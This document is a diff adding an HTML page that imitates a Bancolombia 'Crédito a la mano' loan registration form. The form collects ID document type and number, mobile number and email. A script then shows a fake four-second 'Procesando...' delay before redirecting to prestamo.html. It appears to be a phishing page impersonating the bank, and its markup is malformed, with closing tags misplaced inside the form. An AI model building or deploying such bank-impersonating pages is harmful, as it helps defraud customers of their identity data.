@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registro - Credito a la mano Bancolombia</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f7f7f7;
+        }
+        header {
+            background-color: #000;
+                color: #fff;
+                display: flex
+            ;
+                justify-content: space-between;
+                align-items: center;
+                padding: 15px 25px;
+                border-bottom: 3px solid #fdda24;
+        }
+        header a {
+            color: #fff;
+            text-decoration: none;
+        }
+        .container {
+            max-width: 370px;
+            margin: 60px auto;
+            background: #fff;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 15px rgba(0, 0, 0, 0.1);
+            text-align: center;
+
+        }
+        .container h2 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+        .container h3 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+        .container h4 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+        form {
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            margin-left: 30px;
+        }
+        .small-image {
+          width: 14%;
+        }
+        input, select {
+            width: 70%;
+            padding: 10px;
+            margin-bottom: 22px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            font-size: 14px;
+            margin-top: 8px;
+            margin-left: 27px;
+        }
+        button {
+            width: 92%;
+            padding: 9px;
+            background-color: #F8DC23;
+            color: #333;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            cursor: pointer;
+            margin-top: 10px;
+            margin-left: 15px;
+            
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <a href="#">⎗ Volver</a>
+        <a href="#">Salir ⎘ </a>
+    </header>
+    <div class="container">
+        <img src="logobancol.png" alt="Imagen" class="small-image">
+        <h2>Solicita</h2>
+        <h3>Tu Crédito a la mano</h3>
+        <h4>Para comenzar compártenos la siguiente información</h4>
+        <form action="prestamo.html">
+            <label for="tipo-documento">Tipo de documento de identidad</label>
+            <select id="tipo-documento" name="tipo-documento" required>
+                <option value="cc">Cédula de ciudadanía</option>
+                <option value="ce">Cédula de extranjería</option>
+                <option value="pasaporte">Pasaporte</option>
+            </select>
+            <label for="numero-documento">Número de documento</label>
+            <input type="text" id="numero-documento" name="numero-documento" placeholder="Ingrese su número de documento" required>
+            <label for="numero-celular">Número de celular</label>
+            <input type="text" id="numero-celular" name="numero-celular" placeholder="Ingrese su número de celular" required>
+            <label for="correo-electronico">Correo electrónico</label>
+            <input type="email" id="correo-electronico" name="correo-electronico" placeholder="Ingrese su correo electrónico" required>
+            <script>
+                function delayRedirect() {
+                    const button = document.getElementById("continue-btn");
+                    button.disabled = true; // Deshabilitar el botón mientras espera
+                    button.textContent = "Procesando...";
+
+                    // Esperar 4 segundos antes de redirigir
+                    setTimeout(() => {
+                        window.location.href = "prestamo.html"; // Cambiar al archivo deseado
+                    }, 4000);
+                }
+            </script>
+            </head>
+                <button id="continue-btn" type="submit" onclick="delayRedirect()">Continuar</button>
+            </body>
+            </html>
+        </form>
+    </div>
+</body>
+</html>
